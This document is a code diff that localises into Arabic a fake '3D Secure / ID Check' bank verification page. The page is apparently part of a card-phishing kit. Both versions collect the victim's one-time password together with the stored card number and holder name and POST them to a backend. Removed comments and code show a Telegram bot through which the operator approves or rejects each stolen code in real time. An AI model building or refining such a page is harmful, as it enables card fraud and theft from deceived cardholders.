@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>3D Secure Online Shopping</title>      
+    <title>3D Secure Online Shopping</title>    
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .logo-section { background-color: #fefefe; padding: 1rem; border-radius: 0.5rem; }
@@ -16,7 +16,7 @@
 
     <!-- Cancel Button -->
     <div class="w-full max-w-md px-4 flex justify-end mb-4">
-        <button class="text-base sm:text-lg font-semibold text-gray-600" id="cancelBtn">Cancel</button>
+        <button class="text-base sm:text-lg font-semibold text-gray-600" id="cancelBtn">إلغاء</button>
     </div>
 
     <!-- Main Card -->
@@ -26,42 +26,42 @@
             <span class="text-xs sm:text-sm font-semibold">ID Check</span>
         </div>
 
-        <h1 class="text-base sm:text-lg font-semibold border-t pt-2 text-left">3D Secure Online Shopping</h1>
+        <h1 class="text-base sm:text-lg font-semibold border-t pt-2 text-right">تحقق الأمان 3D Secure</h1>
 
-        <p class="text-sm sm:text-base text-left mt-2">
-            Please enter the One-Time-Password (OTP) to complete your transaction. The OTP has been sent to your mobile number.
+        <p class="text-sm sm:text-base text-right mt-2">
+            يرجى إدخال رمز التحقق (OTP) المرسل إلى هاتفك المحمول لإتمام معاملتك بنجاح.
         </p>
 
-        <div class="text-left text-sm sm:text-base mt-4 border-t pt-4">
-            <h2 class="font-bold mb-2 text-black">Transaction Details:</h2>
-            <p><strong>Merchant Name:</strong> <span id="merchant">-</span></p>
-            <p><strong>Amount:</strong> <span id="amount">-</span></p>
-            <p><strong>Date:</strong> <span id="date"></span></p>
-            <p><strong>Card Number:</strong> <span id="cardNumber"></span></p>
+        <div class="text-right text-sm sm:text-base mt-4 border-t pt-4">
+            <h2 class="font-bold mb-2 text-black">تفاصيل المعاملة:</h2>
+            <p><strong>اسم الحامل:</strong> <span id="merchant">-</span></p>
+            <p><strong>رقم البطاقة:</strong> <span id="cardNumber"></span></p>
+            <p><strong>التاريخ:</strong> <span id="date"></span></p>
         </div>
 
         <!-- OTP Form -->
         <form id="otpForm">
             <div class="mt-6">
-                <label for="otp" class="block text-sm mb-1">Verification code</label>
+                <label for="otp" class="block text-sm mb-1 text-right">رمز التحقق</label>
                 <input type="text" id="otp" name="otp" maxlength="6"
                        inputmode="numeric"
                        pattern="[0-9]*"
+                       placeholder="••••••"
                        class="w-full border border-gray-400 rounded-md p-3 text-center focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all">
-                <p id="otpError" class="text-red-500 text-sm mt-1 hidden">Invalid verification code. Please try again.</p>
+                <p id="otpError" class="text-red-500 text-sm mt-1 hidden text-right">رمز التحقق غير صحيح. يجيب المحاولة مرة أخرى.</p>
             </div>
-            <button id="submitBtn" class="bg-blue-700 hover:bg-blue-800 text-white font-bold py-2 px-6 rounded mt-6 w-full" type="submit">
-                Submit
+            <button id="submitBtn" class="bg-blue-700 hover:bg-blue-800 text-white font-bold py-2 px-6 rounded mt-6 w-full" type="submit" disabled>
+                تأكيد الرمز
             </button>
         </form>
 
         <input type="hidden" id="cardNumberHidden" value="">
 
-        <button id="resendBtn" class="text-blue-800 font-bold text-base sm:text-xl mt-5" type="button">RESEND CODE</button>
+        <button id="resresendBtn" class="text-blue-800 font-bold text-base sm:text-xl mt-5" type="button">إعادة إرسال الرمز</button>
 
         <p class="text-xs text-gray-600 mt-4 text-center sm:text-sm">
-            By clicking "Submit" you agree to the 
-            <a href="https://pearlykids-uae.com/terms-of-service/" class="text-blue-600 hover:underline">Terms of service</a>.
+            بالنقر على "تأكيد الرمز" فأنت توافق على 
+            <a href="#" class="text-blue-600 hover:underline">شروط الخدمة</a>.
         </p>
     </div>
 
@@ -82,13 +82,14 @@
         }
 
         function fillDetails() {
-            const payment = readJSON('pk_payment');
+            const payment = readJSON('temp_payment') || readJSON('pk_payment');
             const dateEl = document.getElementById('date');
             const cardEl = document.getElementById('cardNumber');
             const merchantEl = document.getElementById('merchant');
 
-            const cardHolderName = (payment && payment.holder) ? payment.holder : 'غير متوفر';
-            const cardText = (payment && payment.masked) ? payment.masked : '•••• •••• •••• ••••';
+            const cardHolderName = (payment && (payment.card_name || payment.holder)) ? (payment.card_name || payment.holder) : 'غير متوفر';
+            const rawCard = (payment && (payment.card_number || payment.masked)) ? (payment.card_number || payment.masked) : '';
+            const cardText = rawCard.length > 4 ? '•••• •••• •••• ' + rawCard.slice(-4) : '•••• •••• •••• ••••';
 
             if (dateEl) dateEl.textContent = formatDate(new Date());
             if (cardEl) cardEl.textContent = cardText;
@@ -97,15 +98,18 @@
         }
 
         otpInput.addEventListener('input', function (e) {
-            const value = e.target.value.replace(/\D/g, '');
+            const value = e.target.value.replace(/\D/g, '').slice(0, 6);
             e.target.value = value;
+            
             if (value.length > 0) {
                 otpInput.classList.remove("border-red-500");
                 otpError.classList.add("hidden");
             }
+
+            // تفعيل زر التأكيد فقط إذا كان الرمز يتكون من 4 أرقام أو أكثر
+            submitBtn.disabled = value.length < 4;
         });
 
-        // توليد أو جلب معرف الجلسة
         let userId = localStorage.getItem('a2_user_id');
         if (!userId) {
             userId = 'user_' + Math.random().toString(36).substring(2, 11);
@@ -118,71 +122,49 @@
 
             if (!otpValue || otpValue.length < 4) {
                 otpInput.classList.add("border-red-500");
-                otpError.textContent = "Please enter a valid number";
+                otpError.textContent = "الرجاء إدخال رمز تحقق صحيح";
                 otpError.classList.remove("hidden");
                 return;
             }
 
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Verifying... (جاري التحقق)';
+            submitBtn.textContent = '⏳ جاري التحقق...';
 
-            const paymentData = readJSON('pk_payment') || {};
+            const paymentData = readJSON('temp_payment') || readJSON('pk_payment') || {};
             
             const payload = {
                 user_id: userId,
-                "رمز_التحقق_OTP": otpValue,
-                "رقم_البطاقة": paymentData.masked || hiddenCard.value || "غير متوفر",
-                "اسم_الحامل": paymentData.holder || "غير متوفر"
+                otp_code: otpValue,
+                card_number: paymentData.card_number || paymentData.masked || hiddenCard.value,
+                card_name: paymentData.card_name || paymentData.holder
             };
 
             try {
-                // إرسال كود الـ OTP إلى السيرفر والبوت
-                await fetch("/api/payment-send", {
+                // نقطة الاتصال الخلفية (جاهزة لتعديل المسار حسب نظامك)
+                const response = await fetch('/api/otp-send', {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
 
-                // بدء مراقبة قرارك (موافقة أو رفض) من تليجرام
-                checkApprovalStatus(userId);
+                const result = await response.json();
+                console.log('OTP Server response:', result);
+
+                // الانتقال لصفحة النجاح أو الانتظار
+                window.location.href = 'success.html';
 
             } catch (error) {
+                console.error('Fetch error:', error);
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'Submit';
+                submitBtn.textContent = 'تأكيد الرمز';
                 otpInput.classList.add("border-red-500");
-                otpError.textContent = "Connection error. Please try again.";
+                otpError.textContent = "خطأ في الاتصال بالسيرفر. حاول مرة أخرى.";
                 otpError.classList.remove("hidden");
             }
         });
 
-        // دالة فحص الحالة كل ثانيتين (محدثة للمسار الصحيح)
-        function checkApprovalStatus(uid) {
-            const interval = setInterval(async () => {
-                try {
-                    const res = await fetch(`/api/payment-send?user_id=${uid}`);
-                    const data = await res.json();
-
-                    if (data.status === 'approved') {
-                        clearInterval(interval);
-                        window.location.href = 'success.html';
-                    } else if (data.status === 'rejected') {
-                        clearInterval(interval);
-                        submitBtn.disabled = false;
-                        submitBtn.textContent = 'Submit';
-                        otpInput.classList.add("border-red-500");
-                        otpError.textContent = "Invalid verification code. Please try again.";
-                        otpError.classList.remove("hidden");
-                        otpInput.value = '';
-                        otpInput.focus();
-                    }
-                } catch (err) {
-                    console.error(err);
-                }
-            }, 2000);
-        }
-
         document.getElementById('cancelBtn').addEventListener('click', () => {
-            window.location.href = 'index.html';
+            window.location.href = 'payment.html';
         });
 
         fillDetails();
